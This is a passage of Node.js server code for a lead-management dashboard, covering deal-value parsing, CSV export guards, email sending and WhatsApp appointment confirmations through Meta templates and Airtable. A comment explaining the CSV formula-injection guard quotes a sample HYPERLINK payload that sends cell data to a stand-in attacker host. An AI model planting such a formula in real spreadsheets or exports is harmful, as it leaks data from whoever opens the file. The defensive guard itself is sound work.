    leadsReceived:      total,
    qualifiedCount,
    qualifiedRate:      total > 0 ? Math.round((qualifiedCount / total) * 1000) / 10 : null,
    appointmentsBooked: bookedCount,
    pipelineValueTotal, pipelineValueAvg, pipelineValueCount: dealValues.length,
    avgLeadScore,       avgLeadScoreCount: scores.length,
    avgResponseTime,    avgResponseTimeCount: times.length
  };
}

// Server-side mirror of dashboard.js's parseDealValue (that copy is
// client-side JS embedded in an HTML template string, so it can't be
// require()'d here — same per-file helper duplication convention this
// codebase already uses for escapeFormula/formatApptDateTime/etc). MUST stay
// behaviorally identical: batch C fixed a bug where Belgian/Dutch-formatted
// values like "€ 1.500,00" parsed as 1.5 instead of 1500. Do not change this
// logic here without changing it in dashboard.js too (grep parseDealValue).
function parseDealValueServer(v) {
  if (!v) return 0;
  let s = String(v).replace(/[€\s]/g, '');
  // '.' = thousands separator, ',' = decimal separator when a comma is
  // present ("2.750,00" = 2750). No comma → every '.' is a thousands
  // separator too ("1.500" = 1500, never 1.5) — this format never uses '.'
  // as a decimal point.
  s = s.includes(',') ? s.replace(/\.(?=.*,)/g, '').replace(',', '.') : s.replace(/\./g, '');
  return parseFloat(s) || 0;
}

// CSV/Excel formula-injection guard. Lead-supplied fields (name, notes,
// etc.) come from the public, unauthenticated lead-capture form and are
// written into CSV exports below. If a cell's leading character is =, +, -,
// @, tab or CR, Excel/Sheets can interpret it as a formula (e.g. a
// lead-supplied name of `=HYPERLINK("http://evil/"&A1,"x")` executes on
// open). Prefixing with a single quote neutralizes it while leaving the
// visible text intact. Shared by both export code paths (A2 csv-export and
// GET ?export=true).
function csvFormulaGuard(s) {
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

// Escape HTML entities for safe embedding in email HTML
function escHtml(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ── Email helper (SMTP primary, Resend fallback via _mailer) ─────────────────
async function sendResendEmail({ subject, html, to }) {
  const recipient = to || process.env.NOTIFY_EMAIL;
  if (!recipient) { console.warn('[leads mail] geen ontvanger'); return; }
  const { sendMail } = require('./_mailer');
  await sendMail({ to: recipient, subject, html })
    .catch(err => console.error('[leads mail]', err && err.message));
}

// ── Appointment confirmation (WhatsApp) ───────────────────────────────────────
// Used by appointment-create above. cron-followup.js has its own copy of the
// reminder-side equivalents (sendWATemplate + formatApptDateTime) and
// api/whatsapp.js has its own formatApptDateTime — same per-file helper
// duplication convention already used for mergeWaFailedFlag/escapeFormula
// across this codebase, rather than a shared module.

// Normalize a raw phone string to the digits-only format the Graph API
// expects (E.164 without the leading '+'). Same rules as the test-message
// mode above (line ~800), factored out here since the dashboard's
// appointment form may not enforce a clean format the way the WhatsApp
// webhook's `message.from` always is.
function normalizePhoneForWA(raw) {
  let phone = String(raw || '').replace(/[\s\-\(\)\.]/g, '');
  if      (phone.startsWith('00')) phone = phone.slice(2);
  else if (phone.startsWith('+'))  phone = phone.slice(1);
  else if (phone.startsWith('0'))  phone = '32' + phone.slice(1);
  return /^\d{8,15}$/.test(phone) ? phone : '';
}

// Human-readable appointment date/time in the given language, Brussels tz.
// calendar:'gregory' forced explicitly — some locales default
// Intl.DateTimeFormat to a non-Gregorian calendar (verified: fa-IR silently
// used the Persian/Jalali calendar without this), which would show a
// different day/month than Google Calendar/Airtable for the same appointment.
function formatApptDateTime(iso, lang) {
  const dt = new Date(iso);
  if (isNaN(dt.getTime())) return String(iso || '');
  const opts = { weekday: 'long', day: 'numeric', month: 'long', hour: '2-digit', minute: '2-digit', timeZone: 'Europe/Brussels', calendar: 'gregory' };
  return dt.toLocaleString(_lang.getLocale(lang), opts);
}

// Send an approved Meta template message (required outside the 24h
// customer-service window). `params` = the template's body variables
// {{1}}, {{2}}, ... in order. Never throws — resolves false on any failure,
// same contract as the rest of this file's WhatsApp calls.
async function sendWATemplate(to, templateName, lang, params, phoneNumberId, token) {
  const components = (params && params.length)
    ? [{ type: 'body', parameters: params.map(p => ({ type: 'text', text: String(p) })) }]
    : [];
  try {
    const r = await fetch(`https://graph.facebook.com/v19.0/${phoneNumberId}/messages`, {
      method:  'POST',
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body:    JSON.stringify({
        messaging_product: 'whatsapp', to, type: 'template',
        template: { name: templateName, language: { code: lang }, components }
      })
    });
    const d = await r.json().catch(() => ({}));
    if (!r.ok) { console.error(`[appointment-create] template "${templateName}" naar ${to} mislukt:`, JSON.stringify(d.error || d)); return false; }
    return true;
  } catch (err) {
    console.error(`[appointment-create] template netwerk fout naar ${to}:`, err.message);
    return false;
  }
}

// Dashboard-created appointments have no guarantee the lead has messaged us
// within Meta's 24h customer-service window — unlike the AI in-chat booking
// path (api/whatsapp.js), which is mid-conversation when it books. Sending
// freeform here risks a WhatsApp policy violation / account ban (same risk
// cron-followup.js's follow-up loop already guards against), so this ALWAYS
// goes through an approved template. If none is configured, it skips rather
// than risk it — no confirmation beats a banned WhatsApp number.
//
// Template language: defaults to the client's own Language setting (nl/fr/en,
// same field the rest of the codebase respects) since WhatsApp lets one
// approved template name have multiple approved per-language variants.
// BOOKING_TEMPLATE_LANG, if set, pins every client to a single language
// regardless — useful if the owner has so far only gotten one variant
// approved in Meta Business Manager.
async function sendAppointmentConfirmation({ airtableToken, baseId, clientsTable, projectCode, phone, leadName, startTime }) {
  const TEMPLATE_NAME       = process.env.BOOKING_TEMPLATE_NAME;
  const ENV_PHONE_NUMBER_ID = process.env.PHONE_NUMBER_ID;
  const WHATSAPP_TOKEN      = process.env.WHATSAPP_TOKEN;
  if (!TEMPLATE_NAME || !WHATSAPP_TOKEN) {
    console.warn('[appointment-create] BOOKING_TEMPLATE_NAME of WhatsApp-config ontbreekt. Bevestiging overgeslagen (freeform buiten 24u-venster zou ban riskeren)');
    return;
  }
  const normalizedPhone = normalizePhoneForWA(phone);
  if (!normalizedPhone) { console.warn('[appointment-create] ongeldig telefoonnummer voor bevestiging, overgeslagen'); return; }

  // Best-effort client lookup for name + language + per-client WhatsApp
  // sender number (F_WA_PHONE_NUMBER_ID — multitenancy prep, blank on every
  // client today). A missing/failed lookup falls back to sensible defaults
  // (incl. the shared PHONE_NUMBER_ID env var below) rather than blocking
  // the confirmation.
  let clientName = '', clientLang = 'nl', clientPnid = '';
  try {
    const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
    const cRes = await fetch(
      `https://api.airtable.com/v0/${baseId}/${clientsTable}?filterByFormula=${formula}&maxRecords=1`,
      { headers: { Authorization: `Bearer ${airtableToken}` } }
    );
    if (cRes.ok) {
      const cData = await cRes.json();
      const rec = (cData.records || [])[0];
      if (rec) {
        clientName = rec.fields['fldAnB848Sr5jl6dq'] || rec.fields['Client Name'] || '';
        clientLang = _lang.normalizeLanguageCode(rec.fields['fld1iiV9XwSbgAACZ'] || rec.fields['Language']);
        clientPnid = (rec.fields[F_WA_PHONE_NUMBER_ID] || rec.fields['WhatsApp Phone Number ID'] || '').toString().trim();
      }
    }
  } catch (err) {
    console.error('[appointment-create] klant-lookup voor bevestiging mislukt (gebruikt defaults):', err.message);
  }

  const PHONE_NUMBER_ID = clientPnid || ENV_PHONE_NUMBER_ID;
  if (!PHONE_NUMBER_ID) {
    console.warn('[appointment-create] Geen WhatsApp Phone Number ID (klant noch gedeeld). Bevestiging overgeslagen');
    return;
  }

  // Resolved against Meta's actually-approved template languages (nl/fr/en
  // today) — see _lang.resolveTemplateLanguage()'s header. This is the
  // template-bound half of language support: the dashboard-created booking
  // confirmation ALWAYS goes through an approved template (see this
  // function's own header comment on why), so a client whose Language is
  // now one of the 37 new registry languages falls back to 'nl' here
  // (logged) rather than sending a template call Meta would reject.
  const templateLang = _lang.resolveTemplateLanguage(process.env.BOOKING_TEMPLATE_LANG || clientLang, clientLang).code;
  const firstName = String(leadName || '').trim().split(' ')[0] || '';
  const when = formatApptDateTime(startTime, templateLang);
  await sendWATemplate(normalizedPhone, TEMPLATE_NAME, templateLang, [firstName, when, clientName], PHONE_NUMBER_ID, WHATSAPP_TOKEN);
}

// ── Named exports (in addition to the default route handler) ───────────────
// `module.exports` above is the async handler function itself (a plain JS
// function is also a plain JS object, so attaching properties onto it is
// safe — Vercel just calls the function it required, extra properties are
// ignored). api/cron-followup.js's runTrialLifecycle() reuses these two
// exact aggregation functions for the day-7/day-11 trial emails (TRIAL-
// DESIGN.md §5: "The ROI report IS the sales pitch" — same honest-numbers
// aggregation the Resultaten panel already uses, not a second copy of the
// logic). No behaviour change to this file's own HTTP route.
module.exports.aggregateReportPeriod = aggregateReportPeriod;
module.exports.reportPeriodBounds    = reportPeriodBounds;
// getClientWaPhoneNumberId: per-client WhatsApp sender lookup (multitenancy
// prep, see its own header above). api/cron-followup.js's main follow-up
// loop reuses this EXACT cached lookup (5-min TTL, keyed by projectCode)
// instead of writing a second Airtable-call-per-lead helper — same "reuse,
// don't duplicate" reasoning as the aggregateReportPeriod export above.
module.exports.getClientWaPhoneNumberId = getClientWaPhoneNumberId;
